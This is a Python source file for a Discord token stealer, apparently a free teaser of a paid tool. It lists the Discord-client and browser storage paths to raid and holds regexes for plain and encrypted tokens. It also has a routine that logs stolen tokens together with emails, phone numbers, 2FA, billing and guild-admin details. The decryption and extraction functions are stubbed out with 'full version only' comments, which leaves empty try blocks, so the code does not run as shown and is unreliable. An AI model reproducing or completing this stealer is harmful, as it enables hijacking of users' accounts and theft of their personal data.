# discord_extractor.py
# github: s4yr3x
# Licensed under the MIT License. See LICENSE file in the project root for full license information.

import base64
import json
import os
import re
import requests
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from typing import List, Dict, Optional, Any
from datetime import datetime

class TokenExtractor:
    def __init__(self):
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("LOCALAPPDATA")
        self.roaming = os.getenv("APPDATA")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens: List[str] = []
        
    def get_browser_paths(self):
        return {
            'Discord': f'{self.roaming}\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': f'{self.roaming}\\discordcanary\\Local Storage\\leveldb\\',
            'Discord PTB': f'{self.roaming}\\discordptb\\Local Storage\\leveldb\\',
            'Chrome': f'{self.appdata}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Opera': f'{self.roaming}\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': f'{self.roaming}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Microsoft Edge': f'{self.appdata}\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': f'{self.appdata}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': f'{self.appdata}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\'
        }

    def decrypt_token(self, buff: bytes, master_key: bytes) -> Optional[str]:
        try:
            # [DiscordModule] This functionality is part of the full version only.
        except Exception:
            return None

    def get_master_key(self, path: str) -> Optional[bytes]:
        try:
            # [DiscordModule] This functionality is part of the full version only.
        except Exception:
            return None

    def validate_token(self, token: str) -> bool:
        try:
            # [DiscordModule] This functionality is part of the full version only.
        except Exception:
            return False

    def extract(self) -> List[Dict[str, Any]]:
        # [DiscordModule] This functionality is part of the full version only.

        return token_info_list

    def get_account_info(self, token: str) -> Dict[str, Any]:
        base_info = {
            "token": token,
            "valid": True,
            "username": "Unknown",
            "id": "Unknown",
            "email": "Unknown",
            "phone": "Unknown",
            "avatar": None,
            "nitro": False,
            "billing": False,
            "mfa": False
        }
        
        try:
            # [DiscordModule] This functionality is part of the full version only.
        except Exception:
            base_info["valid"] = False
            
        return base_info

def save_to_file(token_info_list: List[Dict[str, Any]]):
    temp_dir = os.getenv("TEMP") or os.getenv("TMP")
    save_dir = os.path.join(temp_dir, "Discord_log")
    os.makedirs(save_dir, exist_ok=True)

    file_path = os.path.join(save_dir, "info.txt")

    with open(file_path, "w", encoding="utf-8") as f:
        for idx, info in enumerate(token_info_list, 1):
            f.write(f"==== Discord Token #{idx} ====\n")
            f.write(f"Token: {info['token']}\n")
            f.write(f"ID: {info['id']}\n")
            f.write(f"Username: {info['username']}\n")
            f.write(f"Email: {info['email']}\n")
            f.write(f"Phone: {info['phone']}\n")
            f.write(f"2FA: {info['mfa']}\n")
            f.write(f"Nitro: {info['nitro']}\n")
            f.write(f"Billing: {info['billing']}\n")
            f.write(f"Source: {info.get('source', 'Unknown')}\n")

            if info.get("guilds_count"):
                f.write(f"Guilds: {info['guilds_count']}\n")
                f.write(f"Admin Guilds: {info.get('admin_guilds_count', 0)}\n")
                f.write(f"Owned Guilds: {info.get('owned_guilds_count', 0)}\n")

                for g in info.get("important_guilds", []):
                    f.write(f" - {g['name']} (ID: {g['id']}) Owner: {g['owner']} Admin: {g['admin']}\n")

            if info.get("friends_count"):
                f.write(f"Friends: {info['friends_count']}\n")

            f.write("\n")

def main():
    # [DiscordModule] This functionality is part of the full version only.

if __name__ == "__main__":
    try:
        # [DiscordModule] This functionality is part of the full version only.
    except Exception:
        pass